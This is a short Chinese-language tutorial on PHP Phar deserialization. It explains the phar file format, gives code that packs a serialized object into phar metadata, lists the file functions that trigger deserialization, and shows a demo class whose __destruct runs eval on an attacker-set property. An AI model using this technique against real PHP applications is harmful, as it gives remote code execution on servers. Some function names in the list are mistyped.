# PHP 反序列化

### Phar 反序列化

#### 简介

PHP反序列化常见的是使用unserilize()进行反序列化，phar反序列化不需要用到unserilize()，就可以进行反序列化。

#### Phar 基础

Phar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。它有一个特性就是phar文件会以序列化的形式储存用户自定义的`meta-data`。以扩展反序列化漏洞的攻击面，配合`phar://`协议使用。

#### Phar文件结构

1. `a stub`是一个文件标志，格式为 ：`xxx<?php xxx;__HALT_COMPILER();?>`。
前面内容不限，但必须以	`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。

2. `manifest`是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。

3. `contents`是被压缩的内容。

4. `signature`签名，放在文件末尾。

这个文件由四部分组成，`__HALT_COMPILER();`就是相当于图片中的文件头的功能，没有它，图片无法解析，同样的，没有文件头，php识别不出来它是phar文件，也就无法起作用。

#### Phar文件生成
```php
<?php 
class test{
	public $name='phpinfo();';
}
$phar=new phar('test.phar');//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$obj=new test();
$phar->setMetadata($obj);//自定义的meta-data存入manifest
$phar->addFromString("flag.txt","flag");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```
**注意：** php.ini 要将phar.readonly设置为Off 才可以使用。
#### 利用
##### 利用条件

1. phar文件要能够上传到服务器端。
2. 要有可用的魔术方法作为“跳板”。
3. 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。

##### 利用函数
受影响函数列表
* `fileatime`
* `file_put contents`
* `fileinode`
* `is dir`
* `is readable`
* `copy`
* `filectime`
* `file`
* `filemtime`
* `is executable`
* `is writable`
* `unlink`
* `file exists`
* `filegroup`
* `fileowner`
* `is file`
* `is writeable`
* `stat`
* `file_get contents`
* `fopen`
* `fileperms`
* `is link`
* `parse ini file`
* `readfile`
##### 利用实例
```php
<?php
class test{
    public $name='';
    public function __destruct()
    {
        eval($this->name);
    }
}
echo file_get_contents('phar://test.phar/flag.txt');
?>
```